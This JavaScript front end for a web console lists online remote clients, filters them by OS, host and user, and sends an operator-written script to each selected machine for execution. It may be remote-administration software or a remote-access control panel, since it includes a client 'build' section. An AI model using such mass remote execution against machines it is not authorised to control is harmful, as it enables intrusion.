const clientList = document.getElementById("client-list");
const clientSearch = document.getElementById("client-search");
const osFilter = document.getElementById("os-filter");
const selectAllBtn = document.getElementById("select-all-btn");
const clearSelectionBtn = document.getElementById("clear-selection-btn");
const selectedCountSpan = document.getElementById("selected-count");
const scriptEditor = document.getElementById("script-editor");
const scriptType = document.getElementById("script-type");
const executeBtn = document.getElementById("execute-btn");
const outputContainer = document.getElementById("output-container");
const clearOutputBtn = document.getElementById("clear-output-btn");

let allClients = [];
let filteredClients = [];
const selectedClients = new Set();

async function checkAuth() {
  try {
    const res = await fetch("/api/auth/me");
    if (!res.ok) {
      window.location.href = "/login.html";
      return;
    }

    const data = await res.json();
    document.getElementById("username-display").textContent = data.username;

    const roleBadge = document.getElementById("role-badge");
    const roleBadges = {
      admin: '<i class="fa-solid fa-crown mr-1"></i>Admin',
      operator: '<i class="fa-solid fa-sliders mr-1"></i>Operator',
      viewer: '<i class="fa-solid fa-eye mr-1"></i>Viewer',
    };
    roleBadge.innerHTML = roleBadges[data.role] || data.role;

    if (data.role === "admin") {
      roleBadge.classList.add(
        "bg-purple-900/50",
        "text-purple-300",
        "border",
        "border-purple-800",
      );
    } else if (data.role === "operator") {
      roleBadge.classList.add(
        "bg-blue-900/50",
        "text-blue-300",
        "border",
        "border-blue-800",
      );
    } else {
      roleBadge.classList.add(
        "bg-slate-700",
        "text-slate-300",
        "border",
        "border-slate-600",
      );
    }

    if (data.role === "admin") {
      document.getElementById("metrics-link")?.classList.remove("hidden");
      document.getElementById("scripts-link")?.classList.remove("hidden");
      document.getElementById("build-link")?.classList.remove("hidden");
      document.getElementById("users-link")?.classList.remove("hidden");
      document.getElementById("plugins-link")?.classList.remove("hidden");
    } else if (data.role === "operator") {
      document.getElementById("metrics-link")?.classList.remove("hidden");
      document.getElementById("scripts-link")?.classList.remove("hidden");
      document.getElementById("build-link")?.classList.remove("hidden");
    }

    if (data.role === "viewer") {
      alert("Access denied. Operator or Admin role required.");
      window.location.href = "/";
    }
  } catch (err) {
    console.error("Auth check failed:", err);
    window.location.href = "/login.html";
  }
}

async function loadClients() {
  try {
    const res = await fetch("/api/clients?pageSize=10000");
    if (!res.ok) throw new Error("Failed to load clients");

    const data = await res.json();
    allClients = data.items.filter((c) => c.online);
    
    if (allClients.length === 0) {
      clientList.innerHTML = '<div class="p-4 text-center text-slate-500">No online clients available</div>';
      return;
    }

    // Populate OS filter
    const osList = new Set(allClients.map(c => c.os || "unknown"));
    osFilter.innerHTML = '<option value="all">All OS (' + allClients.length + ')</option>' +
      Array.from(osList).sort().map(os => {
        const count = allClients.filter(c => (c.os || "unknown") === os).length;
        return `<option value="${os}">${os} (${count})</option>`;
      }).join("");

    filterAndRenderClients();
  } catch (error) {
    console.error("Failed to load clients:", error);
    clientList.innerHTML = '<div class="p-4 text-center text-red-400">Error loading clients</div>';
  }
}

function filterAndRenderClients() {
  const searchTerm = clientSearch.value.toLowerCase();
  const osValue = osFilter.value;

  filteredClients = allClients.filter(c => {
    const matchesSearch = !searchTerm || 
      (c.host && c.host.toLowerCase().includes(searchTerm)) ||
      c.id.toLowerCase().includes(searchTerm) ||
      (c.os && c.os.toLowerCase().includes(searchTerm)) ||
      (c.user && c.user.toLowerCase().includes(searchTerm));
    
    const matchesOs = osValue === "all" || (c.os || "unknown") === osValue;
    
    return matchesSearch && matchesOs;
  });

  renderClients();
}

function renderClients() {
  if (filteredClients.length === 0) {
    clientList.innerHTML = '<div class="p-4 text-center text-slate-500">No clients match your filters</div>';
    return;
  }

  clientList.innerHTML = filteredClients.map(c => {
    const name = c.host || c.id.substring(0, 8);
    const os = c.os || "unknown";
    const isSelected = selectedClients.has(c.id);
    
    return `
      <label class="flex items-center gap-3 px-4 py-3 hover:bg-slate-800/50 cursor-pointer border-b border-slate-800 last:border-b-0" data-client-id="${escapeHtml(c.id)}">
        <input type="checkbox" class="client-checkbox w-4 h-4 rounded border-slate-600 bg-slate-700 checked:bg-emerald-600" data-id="${escapeHtml(c.id)}" ${isSelected ? 'checked' : ''}>
        <div class="flex-1 min-w-0">
          <div class="font-semibold text-slate-100 truncate">${escapeHtml(name)}</div>
          <div class="text-sm text-slate-400 flex items-center gap-2">
            <span>${os}</span>
            ${c.user ? `<span class="text-slate-500">• ${escapeHtml(c.user)}</span>` : ''}
            <span class="text-slate-600">• ${c.id.substring(0, 8)}</span>
          </div>
        </div>
        <div class="text-emerald-400 text-sm">
          <i class="fa-solid fa-circle text-xs"></i> Online
        </div>
      </label>
    `;
  }).join("");

  clientList.querySelectorAll('.client-checkbox').forEach(cb => {
    cb.addEventListener('change', handleClientToggle);
  });
  
  updateSelectedCount();
}

function handleClientToggle(e) {
  const clientId = e.target.dataset.id;
  if (e.target.checked) {
    selectedClients.add(clientId);
  } else {
    selectedClients.delete(clientId);
  }
  updateSelectedCount();
}

function updateSelectedCount() {
  selectedCountSpan.textContent = `${selectedClients.size} selected`;
  executeBtn.disabled = selectedClients.size === 0;
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

clientSearch.addEventListener("input", filterAndRenderClients);
osFilter.addEventListener("change", filterAndRenderClients);

selectAllBtn.addEventListener("click", () => {
  filteredClients.forEach(c => selectedClients.add(c.id));
  renderClients();
});

clearSelectionBtn.addEventListener("click", () => {
  selectedClients.clear();
  renderClients();
});

document.querySelectorAll(".template-btn").forEach((btn) => {
  btn.addEventListener("click", () => {
    const script = btn.dataset.script;
    const type = btn.dataset.type;
    scriptEditor.value = script;
    scriptType.value = type;
  });
});

executeBtn.addEventListener("click", async () => {
  if (selectedClients.size === 0) {
    alert("Please select at least one client");
    return;
  }

  const script = scriptEditor.value.trim();
  if (!script) {
    alert("Please enter a script to execute");
    return;
  }

  executeBtn.disabled = true;
  const clientIds = Array.from(selectedClients);
  outputContainer.innerHTML = `<div class="text-blue-400">Executing script on ${clientIds.length} client(s)...</div>`;

  const results = [];
  
  for (const clientId of clientIds) {
    const client = allClients.find(c => c.id === clientId);
    const clientName = client ? (client.host || clientId.substring(0, 8)) : clientId.substring(0, 8);
    
    try {
      const res = await fetch(`/api/clients/${clientId}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "script_exec",
          script: script,
          scriptType: scriptType.value,
        }),
      });

      if (!res.ok) {
        results.push({ clientName, clientId, error: `HTTP error! status: ${res.status}` });
        continue;
      }

      const data = await res.json();
      if (!data.ok) {
        results.push({ clientName, clientId, error: data.error || "Unknown error" });
        continue;
      }
      
      results.push({ clientName, clientId, output: data.result || "(no output)" });
    } catch (error) {
      results.push({ clientName, clientId, error: error.message });
    }
  }
  
  outputContainer.innerHTML = results.map(r => {
    if (r.error) {
      return `<div class="mb-4 pb-4 border-b border-slate-800 last:border-b-0">
        <div class="text-emerald-400 font-semibold mb-2">━━━ ${escapeHtml(r.clientName)} (${escapeHtml(r.clientId.substring(0, 8))}) ━━━</div>
        <div class="text-red-400">Error: ${escapeHtml(r.error)}</div>
      </div>`;
    }
    return `<div class="mb-4 pb-4 border-b border-slate-800 last:border-b-0">
      <div class="text-emerald-400 font-semibold mb-2">━━━ ${escapeHtml(r.clientName)} (${escapeHtml(r.clientId.substring(0, 8))}) ━━━</div>
      <div class="text-slate-100">${escapeHtml(r.output)}</div>
    </div>`;
  }).join("");
  
  executeBtn.disabled = false;
});

clearOutputBtn.addEventListener("click", () => {
  outputContainer.innerHTML =
    '<div class="text-slate-500">No output yet. Execute a script to see results.</div>';
});

checkAuth();
loadClients();
